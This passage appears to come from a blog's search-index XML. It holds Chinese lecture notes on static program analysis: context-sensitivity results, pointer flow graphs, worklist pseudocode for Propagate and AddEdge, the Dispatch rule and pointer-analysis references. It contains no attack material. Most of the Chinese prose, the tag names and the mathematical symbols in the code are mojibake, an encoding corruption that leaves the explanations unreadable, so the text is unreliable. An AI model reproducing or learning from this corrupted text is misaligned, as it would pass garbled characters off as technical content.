href="#Experiment" class="headerlink" title="Experiment"></a>Experiment</h2><p>åœ¨ææ¨¾ã€è°­æ·»è€å¸ˆçš„è®ºæ–‡[4]ä¸­ï¼Œå¯¹æ¯”äº†ä¸‰è€…çš„æ•ˆç‡å’Œç²¾åº¦ï¼Œmay-fail-cast æŒ‡å¼ºåˆ¶è½¬æ¢å‡ºé”™çš„æ¬¡æ•°ï¼Œç²¾åº¦è¶Šé«˜å‡ºé”™æ¬¡æ•°ä¼šè¶Šå°‘ï¼Œcall-graph-edge æŒ‡äº§ç”Ÿçš„è°ƒç”¨å›¾è¾¹æ•°ï¼Œç²¾åº¦è¶Šé«˜è¾¹è¶Šå°‘ã€‚<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æ-ä¸Šä¸‹æ–‡æ•æ„Ÿï¼‰/image-20200903205546848.png" alt="image-20200903205546848"></p><p>å¯ä»¥çœ‹å‡ºï¼Œä»å‡†ç¡®ç‡è§’åº¦ï¼Œå¯¹è±¡æ•æ„Ÿæœ€å‡†ç¡®ï¼›ä»æ•ˆç‡è§’åº¦ï¼Œç±»å‹æ•æ„Ÿæ•ˆç‡æœ€é«˜ï¼Œè€Œå¯¹äºé¢å‘å¯¹è±¡çš„ Java è¯­è¨€ï¼Œcall-siteæ•ˆæœæœ€å·®ã€‚</p><p>é¡ºå¸¦ä¸€æçš„æ˜¯ï¼Œè®ºæ–‡[4]ä¸­ä»‹ç»äº†ä¸€ç§æ–°ç®—æ³•ï¼Œå› ä¸ºç¨‹åºåˆ†æåœ¨å¤§å¤šæ—¶å€™ä¸éœ€è¦ä¸Šä¸‹æ–‡æ•æ„Ÿï¼Œå› æ­¤åªåœ¨éœ€è¦ä¸Šä¸‹æ–‡æ•æ„Ÿå¤„ä½¿ç”¨å‡†ç¡®çš„Objectåˆ†æï¼Œå°±å¯ä»¥æ—¢ä¿è¯ç²¾åº¦åˆæœ‰è¶³å¤Ÿçš„é€Ÿåº¦ã€‚</p><h1 id="Propagate-AddEdge-and-Dispatch"><a href="#Propagate-AddEdge-and-Dispatch" class="headerlink" title="Propagate(), AddEdge() and Dispatch()"></a>Propagate(), AddEdge() and Dispatch()</h1><p>Propagate():</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Propagate</span><span class="params">(n, pts)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    n: æŒ‡é’ˆn</span></span><br><span class="line"><span class="string">    pts: nå¯èƒ½æŒ‡å‘çš„æ–°çš„æŒ‡é’ˆé›†åˆ</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> pts <span class="keyword">is</span> <span class="keyword">not</span> empty:</span><br><span class="line">        pt(n) â‹ƒ= pts <span class="comment"># å°†ptså†…å®¹å­˜å…¥åˆ°æŒ‡é’ˆæŒ‡å‘çš„é›†åˆä¸­</span></span><br><span class="line">        <span class="keyword">for</span> each n â†’ s âˆˆ PFG</span><br><span class="line">            add s, pts to WL</span><br></pre></td></tr></table></figure><p>AddEdge():</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddEdge</span><span class="params">(s, t)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> s â†’ t âˆ‰ PFG:</span><br><span class="line">        add s â†’ t to PFG  <span class="comment"># å°†s â†’ tåŠ å…¥PFG</span></span><br><span class="line">        <span class="keyword">if</span> pt(s) <span class="keyword">is</span> <span class="keyword">not</span> empty:</span><br><span class="line">            add &lt;t, pt(s)&gt; to WL <span class="comment"># å°†&lt;t,sæŒ‡å‘å†…å®¹&gt;åŠ å…¥å·¥ä½œé˜Ÿåˆ—</span></span><br></pre></td></tr></table></figure><p>Dispatch()ï¼š</p><script type="math/tex; mode=display">Dispatch(c, m)=\left\{\begin{array}{ll}m' ,& \text{if } c \text{ contains non-abstract method }m' \\& \text{that has the same name and descriptor as }m\\  Dispatch(c', m), & \text{otherwise}\end{array}\right.\\\text{where }c'\text{ is superclass of }c</script><h1 id="Related-work"><a href="#Related-work" class="headerlink" title="Related work"></a>Related work</h1><p>åœ¨åŒ—å¤§è¯¾ç¨‹ä¸­è¿˜ä»‹ç»äº†ä¸¤ç§æŒ‡é’ˆåˆ†ææ–¹æ³•</p><ul><li>AndersonæŒ‡å‘åˆ†æ[5]ï¼Œå¤æ‚åº¦$O(n^3)$ï¼ˆnä¸ºå˜é‡ä¸ªæ•°ï¼‰ï¼Œä¹Ÿå« Inclusion-basedï¼Œæœ¬è¯¾ç¨‹ä»‹ç»CFAä¸ä¹‹ç±»ä¼¼ï¼›</li><li>SteensgaardæŒ‡å‘åˆ†æï¼Œå¤æ‚åº¦ä¸º$O(n\alpha(n))$ï¼ˆnä¸ºè¯­å¥æ•°ï¼Œæ¥è¿‘çº¿æ€§æ—¶é—´ï¼‰ï¼Œä¹Ÿå«Unification-basedã€‚</li></ul><p>è¿˜æœ‰ä¸€ç§æµæ•æ„Ÿçš„æŒ‡é’ˆåˆ†æç®—æ³•[6]ï¼Œå…¶åˆ©ç”¨éƒ¨åˆ†SSAåšæŒ‡é’ˆåˆ†æçš„ä¼˜åŒ–ï¼Œæé«˜åˆ†æé€Ÿåº¦ã€‚</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ol><li>Olin Shivers, 1991. â€œControl-Flow Analysis of Higher-Order Languagesâ€. Ph.D. Dissertation. Carnegie Mellon University.</li><li>Ana Milanova, Atanas Rountev, and Barbara G. Ryder. â€œParameterized Object Sensitivity for Points-to and Side-Effect Analyses for Javaâ€. ISSTA 2002.</li><li>Yannis Smaragdakis, Martin Bravenboer, and Ondrej LhotÃ¡k. â€œPick Your Contexts Well: Understanding Object-Sensitivityâ€. POPL 2011.</li><li>Yue Li, Tian Tan, Anders MÃ¸ller, and Yannis Smaragdakis. â€œA Principled Approach to Selective Context Sensitivity for Pointer Analysisâ€. TOPLAS 2020.</li><li>The Ant and the Grasshopper: Fast and Accurate Pointer Analysis for Millions of Lines of Code, Hardekopf and Lin, PLDI 2007</li><li>Hardekopf B, Lin C. Flow-sensitive pointer analysis for millions of lines of code. CGO 2011:289-298.</li></ol>]]></content>
      
      
      <categories>
          
          <category> Program Language </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç™½ç›’æ‰«æ </tag>
            
            <tag> é™æ€ç¨‹åºåˆ†æ </tag>
            
            <tag> è¿‡ç¨‹é—´åˆ†æ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æï¼‰</title>
      <link href="/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90%EF%BC%89/"/>
      <url>/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="Motivation"><a href="#Motivation" class="headerlink" title="Motivation"></a>Motivation</h1><p>CHA åªçœ‹å®šä¹‰ç±»å‹ï¼Œä¼šå¾—åˆ°å¾ˆå¤šå®é™…ä¸è¢«è°ƒç”¨çš„å­ç±»æ–¹æ³•ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒCHAçš„å¸¸é‡åˆ†ææ—¶åªèƒ½å¾—åˆ°NAC</p><p>è€ŒæŒ‡é’ˆåˆ†æä¼šå¾—åˆ°æ›´ç²¾ç¡®çš„å¯¹è±¡ç±»å‹ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æï¼‰/image-20200818213708639.png" alt="image-20200818213708639"></p><h1 id="Introduction-to-Pointer-Analysis"><a href="#Introduction-to-Pointer-Analysis" class="headerlink" title="Introduction to Pointer Analysis"></a>Introduction to Pointer Analysis</h1><blockquote><p>A fundamental static analysis, computes which memory locations a pointer can point to.</p><p>For object-oriented programs, computes which objects a pointer (variable or field) can point to.</p></blockquote><a id="more"></a><p>å³æŒ‡é’ˆåˆ†æ[1]ç”¨äºåˆ†æä¸€ä¸ªæŒ‡é’ˆç©¶ç«ŸæŒ‡å‘å“ªä¸€å—å†…å­˜ï¼Œå¯¹äºé¢å‘å¯¹è±¡ç¨‹åºï¼ŒæŒ‡é’ˆåˆ†æå¯ç”¨äºåˆ†æä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘å“ªä¸€ä¸ªå˜é‡æˆ–è€…åŸŸã€‚</p><p>æŒ‡é’ˆåˆ†ææ˜¯mayåˆ†æã€‚</p><h2 id="æŒ‡é’ˆåˆ†æå’Œåˆ«ååˆ†æ"><a href="#æŒ‡é’ˆåˆ†æå’Œåˆ«ååˆ†æ" class="headerlink" title="æŒ‡é’ˆåˆ†æå’Œåˆ«ååˆ†æ"></a>æŒ‡é’ˆåˆ†æå’Œåˆ«ååˆ†æ</h2><ul><li><p>æŒ‡é’ˆåˆ†æå›ç­”æŒ‡é’ˆæŒ‡å‘å“ªä¸€ä¸ªå¯¹è±¡ï¼ˆå†…å­˜ï¼‰çš„é—®é¢˜</p></li><li><p>åˆ«ååˆ†æå›ç­”ä¸¤ä¸ªæŒ‡é’ˆæ˜¯å¦æŒ‡å‘åŒä¸€å¯¹è±¡ï¼ˆå†…å­˜ï¼‰çš„é—®é¢˜</p></li></ul><h2 id="æŒ‡é’ˆåˆ†æçš„åº”ç”¨"><a href="#æŒ‡é’ˆåˆ†æçš„åº”ç”¨" class="headerlink" title="æŒ‡é’ˆåˆ†æçš„åº”ç”¨"></a>æŒ‡é’ˆåˆ†æçš„åº”ç”¨</h2><ul><li>åŸºç¡€ä¿¡æ¯æ„å»º<ul><li>Call graphã€åˆ«ååˆ†æ</li></ul></li><li>ç¼–è¯‘å™¨ä¼˜åŒ–</li><li>Bugæ£€æµ‹<ul><li>ç©ºæŒ‡é’ˆå¼‚å¸¸</li></ul></li><li>å®‰å…¨åˆ†æ<ul><li>ä¿¡æ¯æµåˆ†æ</li></ul></li></ul><h1 id="Key-Factors-of-Pointer-Analysis"><a href="#Key-Factors-of-Pointer-Analysis" class="headerlink" title="Key Factors of Pointer Analysis"></a>Key Factors of Pointer Analysis</h1><p>æŒ‡é’ˆåˆ†ææ˜¯ä¸€ä¸ªå¤æ‚ç³»ç»Ÿï¼Œå¾ˆå¤šå› ç´ å½±å“äº†æŒ‡é’ˆåˆ†æçš„å‡†ç¡®åº¦å’Œæ•ˆç‡ï¼š</p><div class="table-container"><table><thead><tr><th>Factor</th><th>Problem</th><th>Choice</th></tr></thead><tbody><tr><td>Heap abstraction</td><td>å¦‚ä½•å¯¹å †å†…å­˜å»ºæ¨¡</td><td>1. Allocation site*; 2. Storeless</td></tr><tr><td>Context sensitivity</td><td>æ˜¯å¦ä¸Šä¸‹æ–‡æ•æ„Ÿ</td><td>1. Context-sensitive*; 2. Context-insensitive*</td></tr><tr><td>Flow sensitivity</td><td>æ˜¯å¦æµæ•æ„Ÿ</td><td>1. Flow-sensitive; 2. Flow-insensitive*</td></tr><tr><td>Analysis scope</td><td>åˆ†æèŒƒå›´</td><td>1. Whole-program*; 2. Demand-driven</td></tr></tbody></table></div><p>æ‰“â€œ*â€å·çš„ä¸ºæœ¬è¯¾ç¨‹ä»‹ç»çš„åˆ†ææ–¹æ³•ã€‚</p><h2 id="Heap-Abstraction-å †æŠ½è±¡"><a href="#Heap-Abstraction-å †æŠ½è±¡" class="headerlink" title="Heap Abstraction(å †æŠ½è±¡)"></a>Heap Abstraction(å †æŠ½è±¡)</h2><p>åœ¨é™æ€åˆ†æè§†è§’ä¸­ï¼Œç¨‹åºä¸­ä¼šåˆ›å»ºæ— é™æ•°é‡çš„å¯¹è±¡å®ä¾‹ï¼ˆè€ƒè™‘åˆ°éš¾ä»¥åˆ†æå¾ªç¯/é€’å½’ç»ˆæ­¢æ¡ä»¶ï¼‰ï¼Œä¸ºäº†ä¿è¯æŒ‡é’ˆåˆ†æèƒ½å¤Ÿç»ˆæ­¢ï¼Œéœ€è¦å°†æ— é™æ•°é‡çš„å¯¹è±¡æŠ½è±¡ä¸ºæœ‰é™æ•°é‡çš„å¯¹è±¡<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æï¼‰/image-20200820210803574.png" alt="image-20200820210803574"></p><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œä¸»è¦æœ‰ä¸¤å¤§æµæ´¾[2]ï¼š</p><ul><li>Store based model</li><li>Storeless model</li></ul><p>å…¶ä¸­ï¼ŒStore based model ä¸­çš„ Allocation sites è¾ƒä¸ºå¸¸ç”¨ï¼Œå…¶æŠ½è±¡ä¾æ®æ˜¯åŒä¸€åˆ›å»ºç‚¹çš„å¯¹è±¡ä¸ºåŒä¸€å¯¹è±¡ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æï¼‰/image-20200820211117510.png" alt="image-20200820211117510"></p><h2 id="ä¸Šä¸‹æ–‡æ•æ„Ÿ"><a href="#ä¸Šä¸‹æ–‡æ•æ„Ÿ" class="headerlink" title="ä¸Šä¸‹æ–‡æ•æ„Ÿ"></a>ä¸Šä¸‹æ–‡æ•æ„Ÿ</h2><p>æŒ‡é’ˆåˆ†æè¿‡ç¨‹ä¸­å¦‚ä½•å¯¹è°ƒç”¨ä¸Šä¸‹æ–‡å»ºæ¨¡ï¼Œä¸»è¦åˆ†ä¸ºä¸¤ç§</p><ul><li>ä¸Šä¸‹æ–‡æ•æ„Ÿ<ul><li>æ¯ä¸€ä¸ªä¸Šä¸‹æ–‡åˆ†æä¸€æ¬¡ </li><li>æ¯æ¬¡è°ƒç”¨æ—¶ï¼Œä¸åŒä¸Šä¸‹æ–‡æ–¹æ³•å¯¹è±¡ä¸ä¸€æ ·ï¼Œé‡å¤åˆ†æå‡½æ•°</li></ul></li><li>ä¸Šä¸‹æ–‡ä¸æ•æ„Ÿ<ul><li>åŒä¸€ä¸ªå‡½æ•°åªåˆ†æä¸€æ¬¡</li><li>åˆ†ææ—¶åˆå¹¶æ‰€æœ‰è°ƒç”¨çš„è¾“å…¥</li><li>ä¸€èˆ¬åœ°ç²¾åº¦è¾ƒä½</li></ul></li></ul><p>ä¸‹å›¾å·¦ä¾§ä¸ºä¸Šä¸‹æ–‡æ•æ„Ÿï¼Œå³ä¾§ä¸ºä¸Šä¸‹æ–‡ä¸æ•æ„Ÿï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æï¼‰/image-20200820211514827.png" alt="image-20200820211514827"></p><p>ä¸ªäººè®¤ä¸ºå¯¹äºç‰¹å®šçš„åˆ†æï¼ˆå¦‚æ±¡ç‚¹åˆ†æï¼‰åšå¥½å‡½æ•°æ‘˜è¦ï¼ˆsummaryï¼‰åï¼Œå°±å¯ä»¥åšä¸Šä¸‹æ–‡ä¸æ•æ„Ÿçš„åˆ†æï¼ŒåŒæ—¶ä¸æŸå¤±ç²¾åº¦ã€‚</p><h2 id="æµæ•æ„Ÿ"><a href="#æµæ•æ„Ÿ" class="headerlink" title="æµæ•æ„Ÿ"></a>æµæ•æ„Ÿ</h2><p>åšæŒ‡é’ˆåˆ†ææ—¶ï¼Œå¯¹æ§åˆ¶æµçš„å¤„ç†</p><ul><li>æ§åˆ¶æµæ•æ„Ÿ[4]<ul><li>è€ƒè™‘æ‰§è¡Œé¡ºåº</li><li>ç»´æŠ¤æ¯ä¸€ç¨‹åºç‚¹çš„æŒ‡é’ˆæŒ‡å‘å…³ç³»</li></ul></li><li>æ§åˆ¶æµä¸æ•æ„Ÿ<ul><li>ä¿å­˜æ‰€æœ‰å¯èƒ½æŒ‡å‘çš„å¯¹è±¡</li></ul></li></ul><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æï¼‰/image-20200820212053813.png" alt="image-20200820212053813"></p><p>å¦‚ä¸Šå›¾ä»£ç ä¸­ï¼Œæ§åˆ¶æµæ•æ„Ÿï¼ˆè“è‰²ï¼‰å¯¹æ¯ä¸ªç¨‹åºç‚¹éƒ½åšäº†è®°å½•ï¼Œè€Œæ§åˆ¶æµä¸æ•æ„Ÿï¼ˆæ©˜è‰²ï¼‰åˆ™ä¿å­˜æŒ‡é’ˆçš„æ‰€æœ‰å¯èƒ½æŒ‡å‘ï¼›</p><p>å…ˆå‰çš„æ•°æ®æµåˆ†æéƒ½æ˜¯æµæ•æ„Ÿçš„ï¼Œè€Œåœ¨javaè¯­è¨€çš„æŒ‡é’ˆåˆ†æä¸­ï¼ŒFlow-sensitiveæ•ˆæœæœªå¿…æ¯”Flow-insensitiveå¥½ï¼Œå› æ­¤ä¸»è¦ä»‹ç» insensitiveã€‚</p><h2 id="Analysis-Scope"><a href="#Analysis-Scope" class="headerlink" title="Analysis Scope"></a>Analysis Scope</h2><p>æŒ‡é’ˆåˆ†æå¯ä»¥åˆ†æå…¨ç¨‹åºï¼Œä¹Ÿå¯æ ¹æ®éœ€è¦åˆ†æéƒ¨åˆ†ä»£ç ä¸­çš„æŒ‡é’ˆä¿¡æ¯ï¼š</p><ul><li>Whole-program<ul><li>åˆ†æç¨‹åºæ‰€æœ‰ä¿¡æ¯</li></ul></li><li>Demand-driven<ul><li>åˆ†æéƒ¨åˆ†æŒ‡é’ˆä¿¡æ¯ </li><li>è®¡ç®—é‡æ¯”å…¨ç¨‹åºå°</li><li>ä½†è€ƒè™‘åˆ°ä¾èµ–ï¼Œæ‰€ä»¥è®¡ç®—é€Ÿåº¦æœªå¿…æ›´å¿«</li></ul></li></ul><h1 id="Concerned-Statements"><a href="#Concerned-Statements" class="headerlink" title="Concerned Statements"></a>Concerned Statements</h1><h2 id="Javaä¸­çš„æŒ‡é’ˆ"><a href="#Javaä¸­çš„æŒ‡é’ˆ" class="headerlink" title="Javaä¸­çš„æŒ‡é’ˆ"></a>Javaä¸­çš„æŒ‡é’ˆ</h2><ul><li>æœ¬åœ°å˜é‡ï¼ˆlocal variableï¼‰ï¼Œe.g., <code>x</code></li><li>é™æ€åŸŸï¼ˆstatic fieldï¼‰, e.g., <code>C.f</code>ï¼Œä½œä¸ºå…¨å±€å˜é‡åˆ†æï¼Œä¸æœ¬åœ°å˜é‡åˆ†ææ–¹æ³•ç±»ä¼¼ï¼ˆæœ¬è¯¾ä¸åšè®¨è®ºï¼‰</li><li>å¯¹è±¡åŸŸï¼ˆinstance fieldï¼‰ï¼Œe.g., <code>x.f</code>ï¼Œå®ä¾‹å¯¹è±¡çš„å±æ€§</li><li><p>æ•°ç»„å…ƒç´ ï¼ˆarray elementï¼‰ï¼Œe.g., array[i]ï¼Œç”±äºé™æ€åˆ†ææ²¡æ³•è®¡ç®—æ•°ç»„ä¸‹æ ‡ï¼Œé€šç”¨åšæ³•å°†å…¶ä½œä¸ºsingle fieldï¼Œä¸å¤„ç†instance fieldç±»ä¼¼ï¼ˆæœ¬è¯¾ä¸åšè®¨è®ºï¼‰<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æï¼‰/image-20200820212836084.png" alt="image-20200820212836084"></p><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼ŒåŸå…ˆæ•°ç»„ä¸‹è¡¨çš„è®¿é—®<code>array[0]</code> å˜ä¸º<code>array.arr</code>ã€‚</p></li></ul><h2 id="ä¸æŒ‡é’ˆåˆ†æç›¸å…³çš„è¯­å¥"><a href="#ä¸æŒ‡é’ˆåˆ†æç›¸å…³çš„è¯­å¥" class="headerlink" title="ä¸æŒ‡é’ˆåˆ†æç›¸å…³çš„è¯­å¥"></a>ä¸æŒ‡é’ˆåˆ†æç›¸å…³çš„è¯­å¥</h2><ul><li>New: <code>x = new T()</code></li><li>Assign: <code>x = y</code></li><li>Store: <code>x.f = y</code></li><li>Load: <code>y = x.f</code></li><li>Call: <code>r = x.k (a, ...)</code></li></ul><p>æ³¨æ„å¯¹äºçœŸå®åœºæ™¯ä¸‹ <code>x.f.g.h=y</code> çš„æƒ…å†µï¼Œåœ¨ä¸‰åœ°å€ç è¡¨ç¤ºæ—¶å¯ä»¥ç”¨ä¸´æ—¶å˜é‡åšç®€åŒ–ï¼Œå˜ä¸º<code>t1=x.f; t2=t1.g; t2.h=y</code></p><p>å¯¹äºå¯¹è±¡è°ƒç”¨(Call)è¯­å¥ï¼Œå­˜åœ¨ä¸‰ç§è°ƒç”¨ç±»å‹ï¼š</p><ul><li>Static callï¼š<code>C.foo()</code></li><li>Special call: <code>super.foo()/x.&lt;init&gt;()/this.privateFoo()</code></li><li>Virtual call: <code>x.foo()</code></li></ul><p>ç”±äº static callå’Œspecial all éƒ½åªæœ‰ä¸€ç§å‡½æ•°åŸå‹ï¼Œå› æ­¤åªéœ€åˆ†ævirtual callçš„æƒ…å†µã€‚</p><h1 id="Pointer-Analysis-Rules"><a href="#Pointer-Analysis-Rules" class="headerlink" title="Pointer Analysis: Rules"></a>Pointer Analysis: Rules</h1><h2 id="Domains-and-Notations"><a href="#Domains-and-Notations" class="headerlink" title="Domains and Notations"></a>Domains and Notations</h2><p>ä»¥ä¸‹ä¸ºéœ€è¦ç”¨åˆ°çš„å®šä¹‰ï¼š</p><ul><li>å˜é‡ï¼š$x,y \in V$</li><li>åŸŸï¼ˆFieldsï¼‰ï¼š$f,g\in F$</li><li>å¯¹è±¡ï¼ˆObjectsï¼‰ï¼š$o_i, o_j \in O$</li><li>å®ä¾‹å±æ€§ï¼ˆInstance fieldsï¼‰ï¼š$o_i.f, o_j.g \in O \times F$</li><li>æŒ‡é’ˆï¼š$Pointer = V \cup (O \times F)$</li></ul><p>æ³¨ï¼š</p><ul><li>$P(O)$ æŒ‡$O$çš„å¹‚é›†</li><li>$pt(p)$ è¡¨ç¤ºæŒ‡å‘ $p$ çš„æŒ‡é’ˆé›†åˆ</li></ul><h2 id="Rules"><a href="#Rules" class="headerlink" title="Rules"></a>Rules</h2><p>$\frac{a}{b}$ä¸ºæ¨å¯¼ç¬¦å·ï¼Œå³å¦‚æœæ¡ä»¶ $a$ æ»¡è¶³ï¼Œé‚£ä¹ˆ $b$ ä¹Ÿæ»¡è¶³ï¼ˆåœ¨inferé‚£ä¹Ÿä»‹ç»è¿‡æ­¤ç¬¦å·ï¼‰ï¼Œä¸ªäººæ„Ÿè§‰å¯ä»¥ç†è§£ä¸º$\{a\}stmt\{b\}$ï¼Œä¹Ÿå¯ä»¥ç†è§£ä¸ºæ»¡è¶³$a$ åï¼Œè¿›è¡Œ$b$æ“ä½œã€‚</p><ul><li><p>Newï¼Œ<code>i: x = new T()</code>ï¼Œæ–°å»ºå¯¹è±¡æ—¶ï¼Œ $o_i$ åŠ å…¥æŒ‡é’ˆé›†ä¸­ (å†™æ³•ä¸åŒï¼‰ï¼š</p><script type="math/tex; mode=display">\frac{}{o_i \in pt(x)}</script></li><li><p>Assign, <code>x = y</code>ï¼Œå‡ºç°èµ‹å€¼åï¼Œè®©yæŒ‡å‘çš„å†…å®¹æŒ‡å‘xï¼š</p><script type="math/tex; mode=display">\frac{o_{i} \in p t(y)}{o_{i} \in p t(x)}</script></li><li><p>Store, <code>x.f = y</code>ï¼Œèµ‹å€¼ç»™å±æ€§æ—¶ï¼Œå°†æŒ‡å‘ $y$ çš„æŒ‡é’ˆä¹Ÿæ”¾å…¥ $o_{i}.f$ çš„é›†åˆä¸­ï¼š</p><script type="math/tex; mode=display">\frac{o_i \in pt(x), o_j \in pt(y)}{o_j \in pt(o_i.f)}</script></li></ul><ul><li>Load, <code>y = x.f</code>ï¼Œå±æ€§èµ‹å€¼ç»™å˜é‡æ—¶ï¼ŒæŒ‡å‘ $o_i.f$ çš„æŒ‡é’ˆæŒ‡å‘ $y$ï¼š<script type="math/tex; mode=display">\frac{o_{i} \in p t(x), o_{j} \in p t\left(o_{i} . f\right)}{o_{j} \in p t(y)}</script></li></ul><p>ä¸‹å›¾ç»™å‡ºå››ç§æƒ…å†µçš„å½¢è±¡è¡¨ç¤ºï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æï¼‰/image-20200821212128271.png" alt="image-20200821212128271"></p><h1 id="How-to-Implement-Pointer-Analysis"><a href="#How-to-Implement-Pointer-Analysis" class="headerlink" title="How to Implement Pointer Analysis"></a>How to Implement Pointer Analysis</h1><blockquote><p>Pointer analysis is to propagate points-to information among pointers (variables &amp; fields).</p></blockquote><p>æŒ‡é’ˆåˆ†æå°±æ˜¯åœ¨å˜é‡å’ŒåŸŸï¼ˆæŒ‡é’ˆï¼‰ä¸­ä¼ é€’æŒ‡å‘å†…å­˜çš„ä¿¡æ¯ã€‚</p><p>ä¹Ÿæœ‰è§‚ç‚¹æ˜¯æŒ‡é’ˆåˆ†æå°±æ˜¯æ±‚è§£ä¸€ç³»åˆ—æŒ‡é’ˆçš„çº¦æŸæ¡ä»¶[3]ã€‚</p><h2 id="Pointer-Flow-Graph"><a href="#Pointer-Flow-Graph" class="headerlink" title="Pointer Flow Graph"></a>Pointer Flow Graph</h2><p>å› æ­¤ä½¿ç”¨å›¾æ¥ä¿å­˜æŒ‡é’ˆä¹‹é—´çš„å…³ç³»ï¼Œå½“æŒ‡é’ˆ x å˜åŒ–æ—¶ï¼ŒåŒæ—¶éœ€è¦æ”¹å˜ x åç»§æŒ‡é’ˆçš„æŒ‡å‘å†…å®¹ã€‚</p><blockquote><p>Pointer flow graph of a program is a directed graph  that expresses how objects flow among the pointers in the program.</p></blockquote><p>å›¾ä¸­çš„ç‚¹ä¸ºæŒ‡é’ˆï¼ˆå˜é‡æˆ–è€…æŠ½è±¡å¯¹è±¡å®ä¾‹çš„åŸŸ/å±æ€§ï¼‰ï¼š</p><p>Nodesï¼š$Pointer = V \cup (O \times F)$</p><p>å›¾ä¸­çš„è¾¹ $x \rightarrow y $ è¡¨ç¤ºæŒ‡é’ˆ $x$ æŒ‡å‘çš„å¯¹è±¡ä¹Ÿè¢« $y$ æŒ‡å‘ï¼ˆ$x$ çš„æŒ‡é’ˆä¿¡æ¯æµå‘ $y$ ï¼‰</p><p>Edgesï¼š$Pointer \times Pointer$</p><p>å› æ­¤ï¼Œå…ˆå‰çš„å››æ¡è¯­å¥äº§ç”Ÿçš„è¾¹å¯ä»¥ç”¨ä¸‹å›¾è¡¨ç¤ºï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æï¼‰/image-20200823104858792.png" alt="image-20200823104858792"></p><h1 id="Pointer-Analysis-Algorithms"><a href="#Pointer-Analysis-Algorithms" class="headerlink" title="Pointer Analysis: Algorithms"></a>Pointer Analysis: Algorithms</h1><h2 id="Worklist"><a href="#Worklist" class="headerlink" title="Worklist"></a>Worklist</h2><p>$WL \subseteq      \left \langle Pointer, \mathcal{P}(O)\right \rangle^*$ï¼Œ å³WLä¸­çš„å…ƒç´ ä¸º$n, pts$ï¼Œè¡¨ç¤ºæŒ‡é’ˆ$n$å¯èƒ½æŒ‡å‘çš„å†…å­˜/å¯¹è±¡é›†åˆä¸º $pts$</p><h2 id="åŠ è¾¹å‡½æ•°-AddEdge-ï¼š"><a href="#åŠ è¾¹å‡½æ•°-AddEdge-ï¼š" class="headerlink" title="åŠ è¾¹å‡½æ•° AddEdge()ï¼š"></a>åŠ è¾¹å‡½æ•° AddEdge()ï¼š</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddEdge</span><span class="params">(s, t)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> s â†’ t âˆ‰ PFG:</span><br><span class="line">        add s â†’ t to PFG  <span class="comment"># å°†s â†’ tåŠ å…¥PFG</span></span><br><span class="line">        <span class="keyword">if</span> pt(s) <span class="keyword">is</span> <span class="keyword">not</span> empty:</span><br><span class="line">            add &lt;t, pt(s)&gt; to WL <span class="comment"># å°†&lt;t,sæŒ‡å‘å†…å®¹&gt;åŠ å…¥å·¥ä½œé˜Ÿåˆ—</span></span><br></pre></td></tr></table></figure><p>å³è‹¥æ·»åŠ  $s \rightarrow t$ ï¼Œé¦–å…ˆæ£€æŸ¥è¯¥è¾¹æ˜¯å¦åœ¨PFGä¸­ï¼Œè‹¥ä¸å­˜åœ¨ï¼Œåˆ™å°†è¯¥è¾¹åŠ 